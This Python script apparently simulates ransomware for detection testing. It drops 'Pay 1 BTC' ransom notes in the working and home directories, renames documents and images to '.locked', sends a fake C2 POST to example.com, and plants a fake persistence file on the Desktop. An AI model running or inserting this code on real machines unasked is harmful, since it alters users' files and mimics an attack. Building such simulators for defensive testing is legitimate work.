import os
import time
import random
from pathlib import Path
import shutil
import socket

def log_event(msg):
    with open("simulator_log.txt", "a") as log:
        log.write(f"[{time.ctime()}] {msg}\n")
    print(msg)

def drop_ransom_note(path):
    note = os.path.join(path, "READ_ME_NOW.txt")
    with open(note, "w") as f:
        f.write("Your files have been encrypted.\nPay 1 BTC to the address below.\nDO NOT TURN OFF YOUR PC.\n")
    log_event(f"Ransom note dropped in {path}")

def fake_encrypt_files(target_dir):
    for root, _, files in os.walk(target_dir):
        for file in files:
            if file.endswith((".txt", ".doc", ".pdf", ".jpg")):
                old_path = os.path.join(root, file)
                new_path = os.path.join(root, file + ".locked")
                try:
                    os.rename(old_path, new_path)
                    log_event(f"Encrypted: {old_path} -> {new_path}")
                except Exception as e:
                    log_event(f"Failed to encrypt {old_path}: {e}")
        break  # Just encrypt top-level for safety

def simulate_network_connection():
    try:
        log_event("Attempting to simulate C2 connection...")
        s = socket.socket()
        s.settimeout(1)
        s.connect(("example.com", 80))
        s.send(b"POST /connect HTTP/1.1\r\nHost: example.com\r\n\r\n")
        s.close()
        log_event("Fake C2 connection sent.")
    except:
        log_event("C2 connection simulation failed (expected).")

def simulate_persistence():
    startup_path = os.path.expanduser("~/Desktop/fake_malware.lnk")
    with open(startup_path, "w") as f:
        f.write("echo I stay forever")
    log_event(f"Simulated persistence via {startup_path}")

def simulate_behavior():
    log_event("=== Ransomware Simulation Started ===")
    
    drop_ransom_note(os.getcwd())
    drop_ransom_note(str(Path.home()))
    fake_encrypt_files(os.getcwd())

    log_event("Spawning dummy processes...")
    for i in range(3):
        os.system(f"echo Simulated malicious process #{i}")
        time.sleep(0.5)

    simulate_network_connection()
    simulate_persistence()
    
    log_event("=== Simulation Complete ===\n")

simulate_behavior()
